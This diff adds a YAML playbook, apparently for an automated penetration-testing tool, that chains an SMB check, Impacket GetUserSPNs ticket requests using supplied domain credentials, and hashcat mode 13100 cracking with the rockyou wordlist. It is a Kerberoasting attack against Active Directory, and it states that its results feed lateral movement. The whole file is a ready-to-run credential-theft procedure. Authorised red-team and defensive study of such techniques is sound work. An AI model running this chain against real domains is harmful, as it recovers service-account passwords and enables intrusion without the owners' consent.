@@ -1,0 +1,57 @@
+name: "AD Attack — Kerberoast"
+description: "Active Directory branch one: request service tickets for every SPN account with valid domain creds, then crack them offline with hashcat. The classic Kerberoasting path; evidence feeds lateral movement."
+category: ad
+attack_vector: "Kerberos TGS request → offline credential cracking"
+variables:
+  target:
+    required: true
+    description: "Domain controller IP (e.g. 10.0.0.1)"
+  domain:
+    required: true
+    description: "AD domain (e.g. corp.local)"
+  user:
+    required: true
+    description: "Domain user with valid credentials"
+  password:
+    required: true
+    description: "Password for the domain user"
+  wordlist:
+    required: false
+    default: "/usr/share/wordlists/rockyou.txt"
+    description: "Wordlist for cracking exported tickets"
+cutting_edge: false
+references: ["MITRE ATT&CK T1558.003", "Impacket GetUserSPNs"]
+
+steps:
+  - name: smb_check
+    tool: smbmap_enum
+    description: "Confirm DC reachability and guest/null access before ticket requests"
+    args:
+      target: "{{target}}"
+    expected_output: "Disk|SMB|error|refused"
+    timeout: 120
+    gate: false
+    retries: 1
+
+  - name: kerberoast
+    tool: impacket_tools
+    description: "Request SPN tickets and export hashes via Impacket (GetUserSPNs)"
+    args:
+      tool: "GetUserSPNs.py"
+      target: "{{domain}}/{{user}}:{{password}}@{{target}}"
+    expected_output: "krb5tgs|hash|SPN|saved|ServicePrincipalNames"
+    timeout: 300
+    gate: true
+    retries: 1
+
+  - name: crack_tgs
+    tool: hashcat_crack
+    description: "Offline crack of the exported TGS hashes (mode 13100)"
+    args:
+      hash_file: "{{hash_file}}"
+      hash_mode: "13100"
+      wordlist: "{{wordlist}}"
+    expected_output: "Cracked|Recovered|Exhausted"
+    timeout: 1800
+    gate: false
+    retries: 1
